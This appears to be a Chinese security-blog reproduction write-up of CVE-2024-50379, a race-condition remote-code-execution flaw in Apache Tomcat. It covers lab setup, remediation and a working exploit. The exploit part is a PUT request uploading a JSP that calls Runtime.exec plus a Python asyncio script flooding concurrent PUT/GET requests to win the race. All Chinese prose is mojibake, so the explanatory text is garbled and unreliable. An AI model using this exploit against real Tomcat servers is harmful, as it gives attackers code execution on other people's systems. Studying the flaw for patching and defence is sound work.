#  CVE-2024-50379ï¼šApache Tomcatè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´   
åŸåˆ› Howell  Timeline Sec   2025-02-13 01:01  
  
> å…³æ³¨æˆ‘ä»¬â¤ï¸ï¼Œæ·»åŠ æ˜Ÿæ ‡ğŸŒŸï¼Œä¸€èµ·å­¦å®‰å…¨ï¼ä½œè€…ï¼šHowellæœ¬æ–‡å­—æ•°ï¼š2941é˜…è¯»æ—¶é•¿ï¼š3 ~ 4minså£°æ˜ï¼šä»…ä¾›å­¦ä¹ å‚è€ƒä½¿ç”¨ï¼Œè¯·å‹¿ç”¨ä½œè¿æ³•ç”¨é€”ï¼Œå¦åˆ™åæœè‡ªè´Ÿ  
  
## 0x01 ç®€ä»‹  
  
Apache Tomcatæ˜¯ä¸€ä¸ªå¼€æºçš„Java Servletå®¹å™¨ï¼Œå¹¿æ³›ç”¨äºè¿è¡ŒJava Webåº”ç”¨ç¨‹åºã€‚å®ƒå®ç°äº†Java Servletå’ŒJavaServer Pages (JSP) æŠ€æœ¯ï¼Œæä¾›äº†ä¸€ä¸ªè¿è¡Œç¯å¢ƒæ¥å¤„ç†HTTPè¯·æ±‚ã€ç”ŸæˆåŠ¨æ€ç½‘é¡µï¼Œå¹¶æ”¯æŒWebSocketé€šä¿¡ã€‚  
  
ApacheÂ Tomcatä»¥å…¶ç¨³å®šæ€§ã€çµæ´»æ€§å’Œæ˜“ç”¨æ€§è€Œå—åˆ°å¼€å‘è€…çš„é’çï¼Œæ˜¯å¼€å‘å’Œéƒ¨ç½²Java Webåº”ç”¨çš„é‡è¦å·¥å…·ä¹‹ä¸€ã€‚  
## 0x02 æ¼æ´æ¦‚è¿°  
  
**æ¼æ´ç¼–å·ï¼šCVE-2024-50379**  
  
è¯¥æ¼æ´çš„ CVSS è¯„åˆ†ä¸º 9.8ï¼Œå±äºé«˜å±æ¼æ´ã€‚æ¼æ´çš„æ ¹æœ¬åŸå› æ˜¯ Tomcat åœ¨éªŒè¯æ–‡ä»¶è·¯å¾„æ—¶å­˜åœ¨ç¼ºé™·ï¼Œç‰¹åˆ«æ˜¯åœ¨ä¸åŒºåˆ†å¤§å°å†™çš„æ–‡ä»¶ç³»ç»Ÿï¼ˆå¦‚ Windowsï¼‰ä¸Šï¼Œå½“readonlyåˆå§‹åŒ–å‚æ•°è¢«è®¾ç½®ä¸ºfalseæ—¶ï¼ˆæœ‰äº›ç‰ˆæœ¬ä¸å­˜åœ¨æ­¤å‚æ•°ï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ¡ä»¶ç«äº‰ä¸Šä¼ æ¶æ„æ–‡ä»¶å¹¶æ‰§è¡Œè¿œç¨‹ä»£ç ã€‚  
## 0x03 å½±å“ç‰ˆæœ¬  
  
9.0.0.M1 <= Apache Tomcat < 9.0.98  
  
10.1.0-M1 <= Apache Tomcat < 10.1.34  
  
11.0.0-M1 <= Apache Tomcat < 11.0.2  
## 0x04 ç¯å¢ƒæ­å»º  
  
1ã€æœ€å¥½å®‰è£…é…ç½®ä¸€å°winçš„è™šæ‹Ÿæœºï¼Œå°†å†…æ ¸å’Œå†…å­˜éƒ½å°½å¯èƒ½è°ƒå°ï¼ˆ==æå‡å¤ç°æˆåŠŸç‡==ï¼‰  
  
2ã€åœ¨Java Downloads | Oracle ä¸­å›½ä¸Šä¸‹è½½JAVA 8ï¼ˆ==ä¸€å®šè¦ä¸‹è½½JAVA 8ï¼Œè¿™ä¸ªç‰ˆæœ¬çš„JAVAå¤ç°æˆåŠŸç‡æœ€é«˜==ï¼‰  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiapBUJndN7wXBnbRNWSF0m2JoekM4LkxYqXIqTOv4UBWWG9twIPBRAYicaMf2Y4E5aZibKjmlCKu7ew/640?wx_fmt=png&from=appmsg "")  
  
3ã€åœ¨Apache-Tomcatä¸­ä¸‹è½½æ¼æ´èŒƒå›´ç‰ˆæœ¬  
  
é…ç½®ç¯å¢ƒå˜é‡  
  
JAVA_HOME  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiapBUJndN7wXBnbRNWSF0m2Kzt3UzrK1qRibMEaw5HDcCicRZregedRFLAsq33GfiaNcNjCa91ib64DfQ/640?wx_fmt=png&from=appmsg "")  
  
%JAVA_HOME%\bin  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiapBUJndN7wXBnbRNWSF0m2LgdmAfqia06PJcCkvzJJAe6yAQdibRyW1yycbAjdVhvLSn00JmBIWp3w/640?wx_fmt=png&from=appmsg "")  
  
CATALINA_BASE  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiapBUJndN7wXBnbRNWSF0m2tjpW0b6JE9oicCB4ZmCWicaIS0sZhWDdMWso4wduibWShiaicodKSNSia3PA/640?wx_fmt=png&from=appmsg "")  
  
æŸ¥çœ‹conf/web.xmlçš„é…ç½®ï¼Œæ£€æŸ¥readonlyçš„å‚æ•°æ˜¯å¦ä¸ºflaseï¼Œå¦‚æœä¸æ˜¯å°±è¿›è¡Œå¦‚ä¸‹é…ç½®ï¼Œæ³¨æ„æ˜¯default servlet(å¤§éƒ¨åˆ†ç‰ˆæœ¬æ˜¯è¦è‡ªå·±æ‰‹åŠ¨å»æ·»åŠ è¿™ä¸ªå‚æ•°ï¼Œåœ¨æ¼æ´ç‰ˆæœ¬ä¸­å¦‚æœå­˜åœ¨ï¼ŒåŸºæœ¬  
é»˜è®¤éƒ½æ˜¯  
flase)  
```
<servlet>
Â Â Â Â <servlet-name>default</servlet-name>
Â Â Â Â <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
Â Â Â Â <init-param>
Â Â Â Â Â Â Â Â <param-name>debug</param-name>
Â Â Â Â Â Â Â Â <param-value>0</param-value>
Â Â Â Â </init-param>
Â Â Â Â <init-param>
Â Â Â Â Â Â Â Â <param-name>listings</param-name>
Â Â Â Â Â Â Â Â <param-value>false</param-value>
Â Â Â Â </init-param>
Â Â Â Â <init-param>
Â Â Â Â Â Â Â Â <param-name>readonly</param-name>
Â Â Â Â Â Â Â Â <param-value>false</param-value>
Â Â Â Â </init-param>
Â Â Â Â <load-on-startup>1</load-on-startup>
</servlet>

```  
  
å¯åŠ¨Tomcatï¼ˆä¹±ç é—®é¢˜ä¸å¤§ï¼Œweb.xmlæ”¹ä¸€ä¸‹GBKå°±æ²¡é—®é¢˜äº†ï¼Œä½¿ç”¨è™šæ‹Ÿæœºçš„IPv4åœ°å€è®¿é—®8080ç«¯å£ï¼‰  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiapBUJndN7wXBnbRNWSF0m2ANen5rySBZ3G4DXxooZ6tQwBejdJnWZWzYUhyeLPbO9eF1JNfpYY0Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiapBUJndN7wXBnbRNWSF0m2hSQT9AzLI0czTLUr4OZ9bZBxyia4qeFGgzXwYsuXW7oCEreD7CTVPFw/640?wx_fmt=png&from=appmsg "")  
## 0x05 æ¼æ´å¤ç°  
  
å¼€å¯æµè§ˆå™¨ä»£ç†ï¼Œä½¿ç”¨YakitæŠ“åŒ…  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiapBUJndN7wXBnbRNWSF0m2R810NosL2yFEDnhicqbYthDo9kNT2T6YasjTashcNFbdtyNl8JBmSPg/640?wx_fmt=png&from=appmsg "")  
åˆ©ç”¨POCå‘åŒ…ï¼ˆ==ä¸‰ä¸ªåŒ…åŒæ—¶å‘é€ï¼ï¼ï¼==ï¼‰  
```
PUTÂ /test.JspÂ HTTP/1.1
Host:Â 192.168.235.131:8080

<%Â Runtime.getRuntime().exec("calc.exe");%>

```  
  
ç¬¬ä¸€ä¸ªåŒ…  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiapBUJndN7wXBnbRNWSF0m2z0yQs8icpONo63XENv3u9HHfRkJMpzH0rakn752QiarUAfFvjCicxPSiag/640?wx_fmt=png&from=appmsg "")  
  
ç¬¬äºŒä¸ªåŒ…  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiapBUJndN7wXBnbRNWSF0m2a5Nj63M44SYdczIG9LuuSZnI6fyvlCMDoo2JQNFP3KsNxuo3BAa51g/640?wx_fmt=png&from=appmsg "")  
  
ç¬¬ä¸‰ä¸ªåŒ…  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiapBUJndN7wXBnbRNWSF0m2KXyb4LiaM95NsmxPl5hAhFIfFLUr0Cykzjiaic1snNIFzTmSAVGwkO5Dw/640?wx_fmt=png&from=appmsg "")  
  
æœ‰æ—¶åªç”¨Yakitè¿›è¡Œå‘åŒ…å°±èƒ½æˆåŠŸï¼Œæœ‰æ—¶ä¸è¡Œï¼Œæ‰€ä»¥ä¸ºäº†æå‡æˆåŠŸç‡ï¼Œå†™ä¸€ä¸ªpythonè„šæœ¬å’ŒYakitä¸€èµ·è¿è¡Œï¼Œå¯¹Tomcatè¿›è¡Œå‘åŒ…  
```
importÂ asyncioÂ Â 
importÂ aiohttpÂ Â 
Â Â 
asyncÂ defÂ send_request(session,Â method,Â url,Â data=None):Â Â 
try:Â Â 
asyncÂ withÂ session.request(method,Â url,Â data=data)Â asÂ response:Â Â 
print(f"RequestÂ toÂ {url}Â completedÂ withÂ statusÂ {response.status}")Â Â 
returnÂ awaitÂ response.text()Â Â 
exceptÂ ExceptionÂ asÂ e:Â Â 
print(f"RequestÂ toÂ {url}Â failed:Â {e}")Â Â 
returnÂ NoneÂ Â 
Â Â 
asyncÂ defÂ main():Â Â 
asyncÂ withÂ aiohttp.ClientSession()Â asÂ session:Â Â 
tasksÂ =Â []Â Â 
forÂ _Â inÂ range(10000):Â #Â å¾ªç¯100æ¬¡Â Â 
tasks.append(send_request(session,Â 'PUT',Â 'http://192.168.235.131:8080/evil.Jsp',Â data='<%Â Runtime.getRuntime().exec("calc.exe");%>'))Â Â 
tasks.append(send_request(session,Â 'PUT',Â 'http://192.168.235.131:8080/test.Jsp',Â data='<%Â Runtime.getRuntime().exec("calc.exe");%>'))Â Â 
tasks.append(send_request(session,Â 'GET',Â 'http://192.168.235.131:8080/evil.jsp'))Â Â 
Â Â 
#Â å¹¶å‘æ‰§è¡Œæ‰€æœ‰ä»»åŠ¡Â Â 
responsesÂ =Â awaitÂ asyncio.gather(*tasks)Â Â 
Â Â 
#Â æ‰“å°éƒ¨åˆ†å“åº”ç»“æœï¼ˆå¯é€‰ï¼‰Â Â 
forÂ i,Â responseÂ inÂ enumerate(responses):Â Â 
ifÂ response:Â Â 
print(f"ResponseÂ {i+1}:Â {response[:100]}...")Â Â 
Â Â 
#Â è¿è¡Œä¸»å‡½æ•°Â Â 
asyncio.run(main())

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiapBUJndN7wXBnbRNWSF0m2jE8C9GqNwNhZX6kskXWMx4vQt61ZmM6vAOFUWyuUb342D5Pg9smKLg/640?wx_fmt=png&from=appmsg "")  
  
è¿”å›çŠ¶æ€ç æ˜¯201ä»£è¡¨ä¸Šä¼ æˆåŠŸï¼Œå¯ä»¥å»webapps/ROOTç›®å½•çœ‹åˆ°ï¼›å†æ¬¡é‡æ”¾è¯·æ±‚çš„æ—¶å€™å°±æ˜¯204çš„çŠ¶æ€ç äº†ï¼Œè¯´æ˜æ–‡ä»¶å·²ç»å­˜åœ¨  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiapBUJndN7wXBnbRNWSF0m27ic9GA2dRoZcaNmg2Wr7FuPlu0wzetGHQrrAZG4EW4CVWlAzibzLPe9Q/640?wx_fmt=png&from=appmsg "")  
  
æˆåŠŸï¼  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/VfLUYJEMVsiapBUJndN7wXBnbRNWSF0m26X2j65fZ7B12gXYVQHWeU5IyNyPYBlecuvyNto4tXEZo2qX9hfPO6g/640?wx_fmt=jpeg&from=appmsg "")  
## 0x06 ä¿®å¤æ–¹å¼  
  
**é…ç½®è°ƒæ•´ï¼š**  
  
- åœ¨ä¸å½±å“ä¸šåŠ¡çš„å‰æä¸‹å°†conf/web.xmlæ–‡ä»¶ä¸­çš„readonlyå‚æ•°è®¾ç½®ä¸ºtrueæˆ–ç›´æ¥æ³¨é‡Šè¯¥å‚æ•°  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiapBUJndN7wXBnbRNWSF0m2eRbdAxaZ8D6Aad1aDDibe90WVGibh3XHu7gB5FPJ4DBVOxDVXQXohZDA/640?wx_fmt=png&from=appmsg "")  
  
- ç¦ç”¨ PUT æ–¹æ³•å¹¶é‡å¯ Tomcat æœåŠ¡ä»¥å¯ç”¨æ–°çš„é…ç½®  
  
**å‡çº§ç‰ˆæœ¬ï¼š**å‡çº§Tomcatç‰ˆæœ¬ä¸ºéæ¼æ´ç‰ˆæœ¬èŒƒå›´  
## å‚è€ƒé“¾æ¥  
  
https://xz.aliyun.com/t/16900  
  
https://mp.weixin.qq.com/s/d7dneaUgF2TD2KGdT1qiQw  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/VfLUYJEMVshRXmfDUFNGlTrAVB52XIXB6ibko0TibK4p8OGzoAXSoHSXvUwQk6FKTkNIslDL675W0QBOPfWmO6IA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
å›å¤  
ã€åŠ ç¾¤ã€‘  
è¿›å…¥å¾®ä¿¡äº¤æµç¾¤å›å¤  
ã€SRCç¾¤ã€‘è¿›å…¥SRC-QQäº¤æµç¾¤å›å¤  
ã€æ–°äººã€‘é¢†å–æ–°äººå­¦ä¹ æŒ‡å—èµ„æ–™å›å¤  
ã€é¢è¯•ã€‘è·å–æ¸—é€æµ‹è¯•å¸¸è§é¢è¯•é¢˜  
  
å›å¤  
ã€æ‰‹å†Œã€‘è·å–åŸåˆ›æŠ€æœ¯PDFæ‰‹å†Œ  
  
å›å¤  
ã€åˆä½œã€‘è·å–å„ç±»å®‰å…¨é¡¹ç›®åˆä½œæ–¹å¼å›å¤  
ã€å¸®ä¼šã€‘ä»˜è´¹åŠ å…¥SRCçŸ¥è¯†åº“å­¦ä¹ å›å¤  
ã€åŸ¹è®­ã€‘  
è·å–TimelineSecåˆ›åŠçš„å®æˆ˜è¯¾ç¨‹  
  
  
è§†é¢‘å·ï¼šæœç´¢TimelineSecï¼Œ[å®˜æ–¹å¾®åš]()  
  
  
å›¢é˜Ÿå®˜ç½‘ï¼š  
http://www.timelinesec.com  
  
Bç«™ï¼š  
https://space.bilibili.com/524591903  
  
  
  
â¤  
  
è§‰å¾—æœ‰ç”¨å°±ç‚¹ä¸ªèµå§ï¼  
  
æ¬¢è¿è¯„è®ºåŒºç•™è¨€è®¨è®ºï½  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OkhKF2m1syrmlAus2fxnsxZBk4oIuTvAVIaL6pKgic5DEa8ynqo44GUwNML3ggkqMpbE1fiaLYvpPzeBrQJCS5bA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
